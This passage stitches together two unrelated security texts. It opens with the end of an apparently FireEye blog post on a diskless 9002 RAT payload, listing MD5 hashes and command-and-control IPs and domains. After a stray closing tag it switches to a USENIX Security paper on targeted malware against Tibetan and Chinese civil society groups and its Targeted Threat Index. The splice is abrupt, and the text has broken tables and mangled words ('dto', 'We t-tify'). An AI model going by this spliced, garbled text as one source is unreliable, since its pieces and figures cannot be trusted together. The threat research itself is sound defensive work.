The XOR decoded data always contains the static value “\x09\x12\x11\x20″ at offset 16.This value is in
fact hardcoded in packet data construction function prior to XOR encoding.This value most likely is the
date “2011-12-09″ but its significance is not known at this time.<figure></figure>
Figure 9 – Packet data construction function showing hardcoded value

The diskless 9002 RAT payload also makes a POST request, which has also changed from the traditional
version.It has Base64 stub data, instead of the static string “AA”.The User-Agent string and URI
pattern remain the same however.It uses the static string “lynx” in the User-Agent string and the
URI is incremental hexadecimal values.</section>
<section>
<heading>
Campaign Analysis
</heading>
We previously observed 104130d666ab3f640255140007f0b12d connecting to the same 111.68.9.93 IP
address.Analysis of MD5 104130d666ab3f640255140007f0b12d revealed that it shared unique identifying
characteristics with 90a37e54c53ffb78969644b1a7038e8c, acbc249061a6a2fb09271a68d53567d9, and
20854f54b0d03118681410245be39bd8.MD5 acbc249061a6a2fb09271a68d53567d9 and 90a37e54c53ffb78969644b1a7038e8c are both
Trojan.APT.9002 variants and connect to a command and control server at 58.64.143.244.MD5 20854f54b0d03118681410245be39bd8 is another Trojan.APT.9002 variant.This variant connected
to a command and control server at ad04.bounceme.net.Passive DNS analysis of this domain revealed that it resolved to 58.64.213.104 between 2011-09-23 and
2011-10-21.While covering a different Internet Explorer Zero-day
(CVE-2013-3893) and the associated Operation DeputyDog campaign, we reported that the CnC
infrastructure used in that campaign overlapped with this same domain: dll.freshdns.org.Inside the in-memory version of the Trojan.APT.9002 payload used in this strategic Web compromise, we
identified the following interesting string: “rat_UnInstall”.As Bit9 notes in their blog,
Trojan.APT.9002 (aka Hydraq/McRAT) was also used in the original Operation Aurora
campaign, and the “rat_UnInstall” string can be found in the original Aurora samples
confirming the lineage.</section>
<section>
<heading>
Conclusions
</heading>
By utilizing strategic Web compromises along with in-memory payload delivery tactics and multiple
nested methods of obfuscation, this campaign has proven to be exceptionally accomplished and elusive.APT actors are clearly learning and employing new tactics.With uncanny timing and a penchant for
consistently employing Zero-day exploits in targeted attacks, we expect APT threat actors
to continue to evolve and launch new campaigns for the foreseeable future.Not surprisingly,
these old dogs continue to learn new tricks.FireEye Labs would like to thank iSIGHT Partners for their assistance with this research.This entry was posted in Exploits, Targeted Attack, Threat Intelligence, Threat Research, Vulnerabilities
by Ned Moran, Sai Omkar Vashisht, Mike Scott and Thoufique Haq.Bookmark the permalink.</section>
</doc>In this paper, we shed light on     
targeted malware attacks faced by these organizations by      
studying malicious e-mails received by 10 civil society       
organizations (the majority of which are from groups re-      
lated to China and Tibet issues) over a period of 4 years.Our study highlights important properties of malware       
threats faced by these organizations with implications on     
how these organizations defend themselves and how we          
quantify these threats.We ﬁnd that the technical sophis-     
tication of malware we observe is fairly low, with more       
effort placed on socially engineering the e-mail con-         
tent.Based on this observation, we develop the Targeted
                                                              
Threat Index (TTI), a metric which incorporates both so-
                                                              
cial engineering and technical sophistication when as-
                                                              
sessing the risk of malware threats.We demonstrate that
                                                              
this metric is more effective than simple technical sophis-
                                                              
tication for identifying malware threats with the high-
                                                              
est potential to successfully compromise victims.We
                                                              
also discuss how education efforts focused on changing
                                                              
user behaviour can help prevent compromise.For two
                                                              
of the three Tibetan groups in our study simple steps
                                                              
such as avoiding the use of email attachments could
                                                              
cut document-based malware threats delivered through
                                                              
e-mail that we observed by up to 95%.</section>
<section>
<heading>                                                              
1   Introduction                                              
</heading>                                                              
Civil society organizations (CSOs), working on hu-            
man rights issues around the globe, face a spectrum           
of politically-motivated information security threats that    
seek to deny (e.g.Internet ﬁltering, denial-of-service at-   
tacks), manipulate (e.g.website defacements) or moni-        
tor (e.g.targeted malware) information related to their      
work.Targeted malware attacks in particular are an in-       

creasing problem for CSOs.These attacks are not iso-
lated incidents, but waves of attacks organized in cam-
paigns that persistently attempt to compromise systems
and gain access to networks over long periods of time
while remaining undetected.These campaigns are cus-
tom designed for speciﬁc targets and are conducted by
highly motivated attackers.The objective of these cam-
paigns is to extract information from compromised sys-
tems and monitor user activity and is best understood as
a form of espionage.CSOs can be particularly suscep-
tible to these threats due to limited resources and lack
of security awareness.Targeted malware is an active re-
search area, particularly in private industry.However,
focused studies on targeted attacks against CSOs are rel-
atively limited despite the persistent threats they face and
the vulnerability of these groups.In this study, we work with 10 CSOs for a period of
4 years to characterize and track targeted malware cam-
paigns against these groups.With the exception of two
groups that work on human rights in multiple countries,
the remaining eight groups focus on China and Tibet-
related human rights issues.We focus on targeted mal-
ware typically delivered via e-mail that is speciﬁcally tai-
lored to these groups as opposed to conventional spam
which has been well characterized in numerous previous
works <fn>[27, 42, 45, 52, 70, 71]</fn>.We consider the threats to
these groups along two axes: the technical sophistica-
tion of the malware as well as sophistication of the so-
cial engineering used to deliver the malicious payload.We combine these two metrics to form an overall threat
ranking that we call the Targeted Threat Index (TTI).While other scoring systems exist for characterizing the
level of severity and danger of a technical vulnerabil-
ity <fn>[7, 17, 41, 50]</fn>, no common system exists for ranking
the sophistication of targeted e-mail attacks.TTI allows
us to gain insights into the relative sophistication of so-
cial engineering and malware leveraged against CSOs.A key to the success of our study is a unique method-
ology, combining qualitative and technical analysis of

<footer>USENIX Association 	                                                              23rd USENIX Security Symposium  527</footer>

e-mails and their attachments with ﬁeldwork (e.g.site          
visits) and interviews with affected CSOs.This method-            
ology, which we describe in more detail in Section 3, al-          
lows us to both accurately rate the level of targeting of e-
mail messages by interfacing with CSOs participating in
our study (Section 4.2), and understand the relative tech-         
nical sophistication of different malware families used in
the attacks (Section 4.3).By combining the strengths of           
our qualitative and quantitative analysis, we are able to
                                                                   
accurately understand trends in terms of social engineer-
                                                                   
ing and technical sophistication of politically-motivated
                                                                   
targeted malware threats faced by CSOs.Our study makes the following observations, which
                                                                   
have implications for security strategies that CSOs can
                                                                   
employ to protect themselves from targeted malware:
                                                                   
Attachments are the primary vector for email based                 
targeted malware.More than 80% of malware deliv-                  
ered to Tibet-related organizations in our study and sub-          
mitted to us is contained in an e-mail attachment.Fur-            
ther, for 2 of the 3 Tibetan organizations in our study            
(with at least 40 submitted e-mails), simply not opening           
attachments would mitigate more than 95% of targeted               
malware threats that use email as a vector.Targeted malware technical sophistication is low.This
                                                                   
ﬁnding highlights the potential for education efforts fo-
                                                                   
cused on changing user behaviours rather than high-cost
                                                                   
technical security solutions to help protect CSOs.CSOs face persistent and highly motivated actors.For numerous malware samples in our study we ob-                   
serve several versions of the software appearing over              
the course of our four year study.These multiple ver-             
sions show evidence of technical improvements to com-
                                                                   
plement existing social engineering techniques.Since the start of our study we have participated in            
a series of workshops with the participating Tibetan or-
ganizations to translate these results into a training cur-        
riculum.Speciﬁcally, we have educated them about how              
to identify suspicious e-mail headers to identify spoofed          
senders and demonstrated tools that can be used to check           
e-mailed links for malware and drive-by-downloads.The rest of the paper is structured as follows.Sec-            
tion 2 presents relevant background on targeted malware            
and attacks on CSOs.Our data collection methodology               
is described in Section 3.We describe our targeting and           
technical sophistication metrics as well as how we com-            
bine them to produce the Targeted Threat Index (TTI)               

   in Section 4.Training and outreach implications of our
work are discussed in Section 5.We present related work
in Section 6 and conclude in Section 7.</section>
<section>
<heading>
2     Background</heading>
2.1    Targeted Malware Overview
Targeted malware are a category of attacks that are dis-
tinct from common spam, phishing, and ﬁnancially mo-
tivated malware.Spam and mass phishing attacks are
indiscriminate in the selection of targets and are directed
to the largest number of users possible.Similarly, ﬁnan-
cially motivated malware such as banking trojans seek
to compromise as many users as possible to maximize
the potential proﬁts that can be made.The social engi-
neering tactics and themes used by these kinds of attacks
are generic and the attack vectors are sent in high vol-
umes.By contrast targeted malware attacks are designed
for speciﬁc targets, sent in lower volumes, and are moti-
vated by the objective of stealing speciﬁc sensitive data
from a target.Targeted malware attacks typically involve the follow-
ing stages <fn>[24, 66]</fn>:
Reconnaissance: During this stage attackers conduct
research on targets including proﬁling systems, software,
and information security defenses used to identify possi-
ble vulnerabilities and contextual information on person-
nel and activities to aid social engineering.Delivery: During this stage a vector for delivering
the attack is selected.Common vectors include e-mails
with malicious documents or links, or contacting targets
through instant messaging services and using social en-
gineering to send malware to them.Typically, a target of
such an attack receives an e-mail, possibly appearing to
be from someone they know, containing text that urges
the user to open an attached document (or visit a web-
site).Compromise: During this stage malicious code is exe-
cuted on a target machine typically after a user initiated
action such as opening a malicious document or link.Command and Control: During this stage the infected
host system establishes a communications channel to a
command and control (C&C) server operated by the at-
tackers.Attackers may also use pe-           
ripherals such as webcams and microphones to monitor               
users in real time.The infected host may also serve as            
a starting point to infect other machines on the network           
and seek out speciﬁc information or credentials.2.2    Targeted Malware and CSOs                                   
Targeted malware has become recognized by govern-                  
ments and businesses around the world as a serious po-             
litical and corporate espionage threat.The United States          
government has been particularly vocal on the threat tar-
geted malware enabled espionage poses.General Keith               
Alexander, current Director of the National Security
Agency and Commander of United States Cyber Com-                   
mand has stated that the theft of US intellectual property         
through cyber espionage constitutes the “greatest transfer         
of wealth in history” <fn>[47]</fn>.Recent widely publicized tar-          
geted malware intrusions against Google, RSA, the New              
York Times and other high proﬁle targets have raised               
public awareness around these attacks <fn>[20, 44, 48]</fn>                 
    Despite this increased attention, targeted malware is
not a new problem, with over a decade of public reports
                                                                   
on these kinds of attacks <fn>[66]</fn>.However, the majority
of research on targeted malware is conducted by private            
security companies who typically focus on campaigns                
against industry and government entities.As a result, tar-        
geted attacks on civil society and non-governmental or-            
ganizations have gone underreported despite the fact that          
these organizations have been shown to be frequently               
targeted by cyber espionage campaigns.In particular,              
communities related to ethnic minority groups in China             
including Tibetans, Uyghurs, and religious groups such             
as Falun Gong have been frequent targets of cyber es-              
pionage campaigns with reports dating back to at least             
2002 <fn>[61]</fn>.In some cases, the same actors have been revealed to           
be targeting civil society groups, government and indus-           
try entities.A notable example of this was the 2009 re-           
port by the Citizen Lab, a research group at the Univer-           
sity of Toronto, which uncovered the “GhostNet” cyber              
espionage network.GhostNet successfully compromised               
prominent organizations in the Tibetan community in ad-            
dition to 1,295 hosts in 103 countries, including min-             
istries of foreign affairs, embassies, international organi-       
zations, and news media <fn>[25]</fn>.While the majority of documented targeted malware              

   campaigns against CSOs involve China and Tibet-related
groups and potentially China-related attack operators
<fn>[9–11, 23, 25, 26, 32, 61–65, 67, 68]</fn> , these kinds of at-
tacks go beyond China.Recent research and news media
have reported attacks against large human rights groups
focused on multiple issues and countries <fn>[31, 46]</fn>, and
communities related to Syria <fn>[18]</fn> and Iran <fn>[37]</fn>.Re-
searchers have also uncovered the use of commercial
network intrusion products used to target activists from
Bahrain <fn>[38]</fn>, the United Arab Emirates <fn>[36]</fn>, and jour-
nalists from Ethiopia <fn>[35]</fn>.</section>
<section>
<heading>
3     Data collection</heading>
Since our study involves dealing with e-mail messages
which may contain personally identiﬁable information
(PII) and collection of information from CSOs who need
to maintain privacy of their data, we consulted with our
institutional research ethics board during the design of
our study.The methods described below have been sub-
mitted to and approved by this board.3.1    Study Participants
We recruited participants via three main channels: (1)
an open call on our Web site, (2) outreach to organi-
zations we had prior relationship with and (3) referrals
from participating groups.As part of the study these
groups agreed to share technical data (e.g., e-mails with
suspicious attachments) and participate in interviews at
the onset and end of the study.Their identity and any PII
shared with us were kept strictly conﬁdential.For the purposes of our study, we focused on organiza-
tions with missions concerning the promotion or protec-
tion of human rights.For purposes of this study, ”human
rights” means any or all of the rights enumerated under
the Universal Declaration of Human Rights <fn>[60]</fn>, the In-
ternational Covenant on Civil and Political Rights <fn>[58]</fn>,
and the International Covenant on Economic, Social and
Cultural Rights <fn>[59]</fn>.We also considered organizations
on a case by case basis that have a mission that does not
directly implicate human rights, but who may nonethe-
less be targeted by politically motivated digital attacks
because of work related to human rights issues (e.g., me-
dia organizations that report on human rights violations).In total, 10 organizations participated in the study
(summarized in Table 1).The majority of these groups
work on China-related rights issues and ﬁve of these or-
ganizations focus speciﬁcally on Tibetan rights.The high
rate of participation from China and Tibet-related human
rights issues is due in part to our previous relationships
with these communities and a signiﬁcant interest and en-
thusiasm expressed by the groups.In addition to the
China and Tibet-related groups, our study also includes        
                                                               3
<footer>USENIX Association 	                                                                  23rd USENIX Security Symposium  529</footer>
two groups, Rights Group 1 and 2 that work on multiple
                                                                  
human rights related issues in various countries.The majority of organizations operate from small of-
                                                                  
ﬁces with less than 20 employees.Some organizations
                                                                  
(China Group 2, Tibet Group 2) have no physical ofﬁce
                                                                  
and consist of small virtual teams collaborating remotely,        
often from home ofﬁces.Of these groups only two                  
(China Group 1, China Group 3) have a dedicated system            
administrator on staff.Other groups (Tibet Groups 1-5;           
China Group 2) rely on volunteers or staff with related           
technical skills (e.g.Web development) to provide tech-          
nical support.Rights Group 1 and Rights Group 2 are              
much larger organizations relative to the others in our
sample.Both organizations have over 100 employees,
multiple ofﬁces, dedicated IT teams, and enterprise level
computing infrastructures.</section>
<section>                                                                  
3.2    Data Sources                                               
We collect the following pieces of information from the           
participant groups in order to understand the malware             
threats they face:                                                
                                                                  
User-submitted e-mail messages.Our primary data                  
source is a collection of e-mails identiﬁed by participants       
as suspicious which were forwarded to a dedicated e-              
mail server administered by our research team.When               
available these submissions included full headers, ﬁle
attachments and / or links.There are three key limita-
tions to relying on user-submitted e-mails for our anal-          
ysis.First, we are only able to study e-mails identiﬁed
by participants as suspicious, which may bias our re-             
sults to only reporting threats that have been ﬂagged by          
users.Further, individuals may forget to forward e-mails         
in some cases.Relying on self-reporting also creates bias        
between groups as individuals at different organizations          
may have different thresholds for reporting, which cre-           
ates difﬁculties in accurately comparing submission rates         
between groups.Thus the amount of threat behaviour               
we see should be considered a lower bound on what oc-             
curs in practice.Second, having participants forward us          
e-mails does not allow us to verify if the targeted organi-       
zation was successfully compromised by the attack (e.g.,          
if another member of the organization open and executed           
malware on their machine) and what the scope of the at-           
tack was.Finally, e-mail is only one vector that may be          
used to target organizations.Other vectors include water-        
hole attacks <fn>[21]</fn>, denial of service attacks, or any other        
vectors (e.g., physical threats like infected USB sticks).These limitations mean that it is possible that we did not        
comprehensively observe all attacks experienced by our            
study groups and some more advanced attacks may have              
gone unreported.Recognizing the limitations of e-mail submissions, we          
complement user submitted emails with data from Net-              

  Table 2: Breakdown of e-mails submitted per group.Also, upon request of
study groups who were concerned of possible infection
we analyzed packet capture data from suspect machines.Through the course of this supplementary analysis we
did not ﬁnd indications of malware compromise that
used samples that were not included in our pool of user-
submitted emails.In this paper we focus on reporting
results from analyzing the user submitted emails through
the TTI.The NIDS and website monitoring components
were added later in our study and do not signiﬁcantly
contribute to TTI analysis.<fn>1</fn>
</section>
<section>
3.3    Overview of User-Submitted E-mails
The e-mails examined in this study span over four years,
from October 14, 2009 to December 31, 2013.Data col-
lection began on November 28, 2011, but China Group
3 and Tibet Group 1 forwarded us their pre-existing
archives of suspicious emails, resulting in e-mail sam-
ples dating back to October 14, 2009.In total, we re-
ceived 817 e-mails from the 10 groups participating in
our study.Table 2 breaks down the submissions from
each groups and illustrates that submissions were highly
non-uniform across the groups.Thus, in general, we fo-
cus on the groups with at least 50 e-mail submissions for
our analysis.Figure 1 shows the cumulative number of e-mail sub-
missions per month over the course of the study.For
example, China Group 3 shared a set of e-mails received
in 2010 by a highly targeted member of the organization,
which can be observed in Figure 1.Tibet Group 1 ac-
counts for the highest number of submissions relative to
the other groups due to being one of the ﬁrst groups in
the study and being persistently targeted by politically
motivated malware.Tibetan Groups 2 and 4, who joined
the study later (in April 2012) show a similar submission
rate to original Tibetan Group 1, suggesting these groups
are targeted at a similar rate.In Section 4.2, we investi-
                                                              4
<footer>530  23rd USENIX Security Symposium	                                                                     USENIX Association</footer>
                                                                          Table 1: Summary of groups participating in our study.Figure 2: Breakdown of malicious e-mails based on
whether they deliver malware as an attachment, refer 
use to a link with a malicious ﬁle, or attempt to phish   the
data from the user.gate commonalities in targeting of these groups.We further classify e-mails as malicious if they include                                      
attached malware, a direct link to malware or a site with                                        
a drive-by download, or a link to a phishing page.Fig-                                          
ure 2 shows the amount of e-mails of each type for the                                           
groups that submitted at least 25 e-mails to our system.The most common approach employed in these e-mails                                               
was attaching a malicious payload to the e-mail itself.However, we notice a higher rate of phishing attacks on                                          
the China-related groups and the rights groups working                                           
on multiple international human rights issues.In partic-
ular, 46% of the e-mails submitted by China Group 1,
and 50% of the e-mails submitted by Rights Group 1, di-                                          
rect the user to a phishing Web site.In the case of China
Group 1, this large proportion of phishing sites is ob-                                          
served because this group conﬁgured their spam ﬁlter to                                          
forward e-mails to our system, resulting in us receiving                                         
a large number of generic, non-targeted spam.In con-                                            
trast, the phishing observed for Rights Group 1, while                                           
low in volume (13 out of 26 messages) is targeted.We                                            
delve more into how we rate the targeting of e-mails in                                          
Section 4.2.The rate of submissions to our project meant that it                                          
was feasible to manually analyze e-mail attachments for
   malware as they were submitted.This analysis gives us
   higher conﬁdence in our results because AV signatures
   are frequently unable to detect new or modiﬁed threats,
   and can overlook the presence of a malicious payload
   that can be easily identiﬁed upon manual inspection (e.g.shellcode in an RTF exploit).In total, we analyzed 3,617
   payload ﬁles and found 2,814 (78%) of them to be ma-
   licious.Section 4.3 describes our analysis methodology
   in more detail.</section>
   <section>
   <heading>
   4                                  Targeted Threat Index</heading>
   Our dataset includes a wide range of targeted malware
   threats varying in level of both social engineering and
   technical complexity.This range presents a challenge
   in ranking the relative sophistication of the malware and
   targeting tactics used by attackers.This gap is       
likely because evaluating the sophistication of the target-        
ing is non-technical, and cannot be automated due to the           
requirement of a strong familiarity with the underlying
subject material.To address this gap we developed the Targeted Threat
Index (TTI) to assign a ranking score to the targeted ma-          
licious emails in our dataset.The TTI score is intended           
for use in prioritizing the analysis of incoming threats,          
as well as for getting an overall idea of how severely an          
organization is threatened.The TTI score is calculated by taking a base value de-          
termined by the sophistication of the targeting method,            
which is then multiplied by a value for the technical              
sophistication of the malware.The base score can be               
used independently to compare emails, and the combined             
score gives an indication of the level of effort an attacker       
has put into individual threats.Scores of 0 are reserved for threats
                                                                   
that are not targeted, even if they are malicious.For
                                                                   
example, spam using an attached PDF or XLS to by-
                                                                   
pass anti-spam ﬁlters, and highly sophisticated ﬁnan-
                                                                   
cially motivated malware, would both score 0.This section overviews how we compute the Social
                                                                   
Engineering Sophistication Base Value (Section 4.2) and
                                                                   
the Technical Sophistication Multiplier (Section 4.3).In
                                                                   
Section 4.4, we present the results of computing and an-
                                                                   
alyzing the TTI value of threats observed by the organi-
                                                                   
zations in our study.We also discuss implications and
                                                                   
limitations of the metric.</section>
<section>                                         
4.2    Social Engineering Tactics                                  
                                                                   
We leverage a manual coding approach to measure the                
sophistication of social engineering tactics used in the at-       
tacks observed by the organizations in our study.While            
automated approaches may be explored in the future, this           
manual analysis allows us to have high conﬁdence in our            
results, especially since understanding the social engi-           
neering often required contextual information provided             
by the organizations in our study.To quantify the level           
of sophistication, we manually analyse the e-mail subject          
line, body, attachments and header ﬁelds.We perform an            
initial content analysis by coding the e-mails based on            

   their semantic content, and then use these results to gen-
erate a numerical metric quantifying the level of targeting
used.4.2.1   Content coding and analysis results
We code the e-mails based on their subject line, body, at-
tachments and headers using the following methodology:
Subject line, body, and attachments.Table 3 summarizes the themes and provides examples
of categories within each theme.E-mail headers.The header of each e-mail was an-
alyzed to determine if the sending e-mail address was
spoofed or the e-mail address was otherwise designed
to appear to come from a real person and / or organiza-
tion (e.g.by registering an e-mail account that resembles
a person and / or organization’s name from a free mail
provider).We divide the results based on whether they
attempted to spoof an organization or a speciﬁc person.Using this manual analysis, we perform a content anal-
ysis of e-mails submitted by the organizations.Results
of this analysis conﬁrm that social engineering is an im-
portant tool in the arsenal of adversaries who aim to de-
liver targeted malware.Speciﬁcally, 95% and 97% of
e-mails to Chinese and Tibetan groups, respectively, in-
cluded reference to relevant regional issues.Spooﬁng
of speciﬁc senders and organizations was also prevalent
with 52% of e-mails to Tibetan groups designed to ap-
pear to come from real organizations, often from within
the Tibetan community.For example, a common tar-
get of spooﬁng was the Central Tibetan Administration
(CTA), referenced in 21% of the spoofed e-mails, which
administers programs for Tibetan refugees living in In-
dia and advocates for human rights in Tibet.While the
number of e-mail submissions were lower for the gen-
eral human rights groups, we observe similar trends there
with 92% of e-mails submitted by Rights Group 1 ap-
pearing to come from individuals in the group (as a result
of spooﬁng).In some cases we even observed the same attackers
targeting multiple CSOs with customized e-mail lures.For example, we tracked a campaign that targeted China
Groups 1 and 2, and Tibet Group 1 with a remote access
                                                               6
<footer>532  23rd USENIX Security Symposium	                                                                      USENIX Association</footer>

        Table 3: Overview of themes and categories within the themes for grouping targeted e-mail messages.In contrast, Tibet Group 1 re-               
ceived the malware embedded into a video of a speech                
by the Dalai Lama, attached to an e-mail about a year in            
review of Tibetan human rights issues.4.2.2   Social Engineering Sophistication Base Value                

While the content analysis results clearly show attacks
tailored to the interests of targeted groups, content cod-          
ing alone does not give a relative score of the sophistica-         
tion used in the attacks.We now describe how we assign             
the “social engineering sophistication base value” to e-            
mails based on their level of social engineering.To measure the targeting sophistication we assign a              
score that ranges from 0-5 that rates the social engineer-          
ing techniques used to get the victim to open the attach-           
ment.This score considers the content and presentation
of the e-mail message as well as the claimed sender iden-
tity.This determination also includes the content of any           
associated ﬁles, as malware is often implanted into legit-          
imate relevant documents to evade suspicion from users              
when the malicious documents are opened.The Social Engineering Sophistication Base Value is              
assigned based on the following criteria:                           
0 Not Targeted: Recipient does not appear to be a spe-              
ciﬁc target.Content is not relevant to the recipient.The          
e-mail is likely spam or a non-targeted phishing attempt.1 Targeted Not Customized: Recipient is a speciﬁc                   
target.Content is not relevant to the recipient or contains        
information that is obviously false with little to no valida-       
tion required by the recipient.The e-mail header and/or            
signature do not reference a real person or organization.2 Targeted Poorly Customized: Recipient is a speciﬁc                
target.Content is generally relevant to the target but has         
attributes that make it appear questionable (e.g.incom-            
plete text, poor spelling and grammar, incorrect address-           
ing).The e-mail header and / or signature may reference            
a real person or organization.3 Targeted Customized: Recipient is a speciﬁc target.Content is relevant to the target and may repurpose legit-
imate information (such as a news article, press release,
conference or event website) and can be externally ver-
iﬁed (e.g.message references information that can be
found on a website).Or, the e-mail text appears to re-
purpose legitimate e-mail messages that may have been
collected from public mailing lists or from compromised
accounts.The e-mail header and / or signature references
a real person or organization.4 Targeted Personalized: Recipient is a speciﬁc target.The e-mail message is personalized for the recipient or
target organization (e.g.speciﬁcally addressed or refer-
ring to individual and / or organization by name).Con-
tent is relevant to the target and may repurpose legitimate
information that can be externally veriﬁed or appears to
repurpose legitimate messages.The e-mail header and /
or signature references a real person or organization.5 Targeted Highly Personalized: Recipient is a spe-
ciﬁc target.The e-mail message is individually person-
alized and customized for the recipient and references
conﬁdential / sensitive information that is directly rele-
vant to the target (e.g.internal meeting minutes, com-
promised communications from the organization).The
e-mail header and / or signature references a real person
or organization.Content coding of emails and determinations of so-
cial engineering ratings for the TTI were performed by
ﬁve independent coders who were given a code book for
content categories and the TTI social engineering scale
with examples to guide analysis.We performed regu-
lar inter-rater reliability checks and ﬂagged any poten-
tial edge cases and inconsistencies for discussion and re-
evaluation.Following completion of this analysis, two
of the authors reviewed the social engineering base value
scores to ensure consistency and conformity to the scale.We provide speciﬁc examples of each of these targeting
values in Appendix A.4.2.3                            Summary of Social Engineering Sophistica-                       
                                 tion Base Value                                                 
                                                                                                 
Figure 3 shows the targeting score for organizations in
                                                                                                 
our study who submitted at least 50 e-mails.The malware is then analyzed in de-
                                                                                                 
tail to extract information such as the vulnerability, C&C
                                                                                                 
server (if present), and technical sophistication of the ex-
                                                                                                 
ploit.4.3.1                            Assessment methodology
                                                                                                 
The ﬁrst step in our analysis pipeline is determining
whether the email contains politically motivated malware                                         
or not.This process involves an initial inspection for                                          
social engineering of the email message and attachment                                           
(e.g., an executable pretending to be a document).We                                            
also correlate with other emails received as part of this                                        
project to identify already-known malware.Well-known                                            

malware attacks (e.g., the Zeus trojan masquerading as
   an email from the ACH credit card payment processor,
 or Bredolab malware pretending to be from the DHL
courier service) are not considered targeted attacks in our
study, but are still kept for potential review.Once we have identiﬁed emails which we suspect of
  containing politically-motivated malware, we perform
the following analysis steps on any attachments to ver-
ify that they indeed contain malware.First, we run the
attachment in a sandboxed VM to look for malicious ac-
tivity e.g., an Ofﬁce document writing ﬁles to disk or try-
ing to connect to a C&C server.We also check the MD5
hash of the attachment against the Virus Total dto
see if it matches existing viruses.We also manually ex-
amine the attached ﬁle for signs of malicious intent (e.g.,
executable payload in a PDF, shellcode or Javascript).We exclude any graphics attached to the email which are
used for social engineering (and do not contain malicious
payload) from our analysis.We follow this initial analysis with more dtech-
nical analysis of the attachments which we conﬁrm con-
tain malware.First, we manually verify the ﬁle type of
the attachment for overview statistics.This manual anal-
ysis is necessary as the Unix ﬁle command may be mis-
led by methods of manipulating important bytes in the
ﬁle (e.g., replacing \rtf1 with \rtf[null]).We t-
tify if the vulnerability included in the malware already
exists in a corpus of vulnerabilities, such as the Com-
mon Vulnerabilities and Exposures (CVE) naming sys-
tem.We also perform analysis of network trafﬁc from
the attachment to identify the C&C server the malware
attempts to contact.In cases where the malware does
not execute in our controlled environment we manually
examine the ﬁle to extract the relevant information.On a case-by-case basis we use additional tools such
as IDA <fn>[1]</fn> and OllyDbg <fn>[3]</fn> for detailed static and dy-
namic analysis, respectively.Our goal in this analysis
is to identify relationships between malware campaigns
between organizations, or instances of the same malware
family repeatedly targeting a given organization.By ob-
serving overlapping C&C servers, or mapping malware
to common exploits identiﬁed by anti virus/security com-
panies we can cluster attacks that we believe come from
the same malware family and potentially the same adver-
sary.4.3.2   Technical Sophistication Multiplier
While the previous analysis is useful for understanding
the nature of threats, we also score threats numerically to
aid in understanding the relative technical sophistication
of their approaches.Each malware sample is assigned
one of the following values:
1 Not Protected - The sample contains no code protec-
                                                                                                     8
<footer>534  23rd USENIX Security Symposium	                                                                                   USENIX Association</footer>
                                                            
tion such as packing, obfuscation (e.g.simple rotation       
of interesting or identifying strings), or anti-reversing




                                                              
                                                              
tricks.1.5 Multiple Minor Protection Techniques - The sam-           
ple contains multiple distinct minor code protection tech-    
niques (anti-reversing tricks, packing, VM / reversing
tools detection) that require some low-level knowledge.This level includes malware where code that contains the      
core functionality of the program is decrypted only in        
memory.1.75 Advanced Protection - The sample contains mi-
                                                              
nor code protection techniques along with at least one
                                                              
advanced protection method such as rootkit functionality
                                                              
or a custom virtualized packer.2 Multiple Advanced Protection Techniques - The               
sample contains multiple distinct advanced protection         
techniques, e.g.rootkit capability, virtualized packer,      
multiple anti-reversing techniques, and is clearly de-        
signed by a professional software engineering team.The purpose of the technical sophistication multiplier     
is to measure how well the payload of the malware can         
conceal its presence on a compromised machine.We use         
a multiplier because advanced malware requires signif-        
icantly more time and effort (or money, in the case of        
commercial solutions) to customize for a particular tar-      
get.We focus on the level of obfuscation used to hide pro-     
gram functionality and avoid detection for the follow-        
ing reasons: (1) It allows the compromised system to          
remain infected for a longer period; (2) it hinders ana-      
lysts from dissecting a sample and developing instruc-        
tions to detect the malware and disinfect a compromised       
system; (3) since most common used remote access tro-
jans (RATs) have the same core functionality (e.g.key-
                                                              
logging, running commands, exﬁltrating data, control-
ling microphones and webcams, etc.)the level of ob-          
fuscation used to conceal what the malware is doing can       
be used to distinguish one RAT from another.4.3.3   Summary of Technical Sophistication Multi-            
        plier Value                                           
                                                              
Figure 4 shows the technical sophistication multiplier        
values for e-mails submitted by the different organiza-       
tions in our study.reported by our study groups is relatively simple.The
    highest multiplier value we see is 1.5 and even that value
    is seen infrequently.The majority of malware observed
    is rated either 1 or 1.25 according to our technical scoring
    criteria, with Tibetan Groups observing a higher fraction
    of malware rated 1.25 and Chinese groups observing a
    higher fraction rated 1.The technical sophistication multiplier value is also
    useful for assessing the technical evolution of threats in
    our study.When we group malware into different fam-
    ily groups we can see some of these groups are under
    active development.For example, we observe multiple
    versions of the Enfal <fn>[40, 49]</fn>, Mongal <fn>[14]</fn>, and Gh0st
    RAT <fn>[15]</fn> families with increasing levels of sophistica-
    tion and defenses in place to protect the malware code
    (resulting in an increase in technical multiplier from 1 to
    1.25 for these families).Since our technical multiplier
    value focuses on how well malware code defends and
    disguises itself, changes to other aspects of the code may
    not result in an increase in value (e.g., we observe multi-
    ple versions of the IMuler.A/Revir.A malware which all
    receive a score of 1).Interestingly, when we observe both
    a Windows and Mac version of a given malware family,
    the technical score for the Mac version tended to be lower
    with the Mac version being relatively primitive relative to
    the Windows variant.</section>
    <section>
    4.4                               TTI Results
    We now show how the TTI metric can help us better char-
    acterize the relative threat posed by targeted malware.Figure 5 shows the technical sophistication multiplier
    and maximum/minimum TTI scores for malware fami-
    lies observed in our dataset.Since we primarily observe
    simple malware, with a technical sophistication multi-
    plier of 1 or 1.25, this value does a poor job of differen-
    tiating the threat posed by the different malware families
    to the CSOs.Soph.Soph..duojeen                5          1.25
                                                                                                                                                                                                                                                     iexpl0re               5          1.25

threats may be in practice.The impact of using TTI is especially apparent when
trying to gain insights into the targeted malware that                                                                                                                                                                                       
poses the biggest risk to CSOs.Table 4 shows the top                                                                                                 
5 malware families we observe in terms of technical so-                                                                                               
phistication and in terms of TTI score.If we consider the                                                                                            
malware families with the highest technical sophistica-                                                                                               
tion, we can see that their TTI values are relatively low,                                                                                            
with maximums ranging from 1.5 to 4.5.These tend to be                                                                                               
malware families that are familiar to researchers.In par-                                                                                            
ticular, PlugX and PoisonIvy have been used in targeted                                                                                               
attacks together <fn>[43]</fn> and PlugX is still actively used and                                                                                            
under constant development <fn>[16]</fn>.In contrast, the top 5 malware families in terms of                                                                                             
TTI have lower technical sophistication (1.25) but much                                                                                               
higher levels of social engineering.It is no surprise that                                                                                           
threats which score the highest TTI use well known mal-                                                                                               
ware that have been extensively documented in attacks                                                                                                 
against a variety of targets.For example, the TTI scores                                                                                             
reﬂect that Gh0st RAT continues to be seen in higher                                                                                                  
risk attacks due to its popularity amongst attackers even                                                                                             
though it is an older and not particularly advanced tool.Indeed,                                                                                             
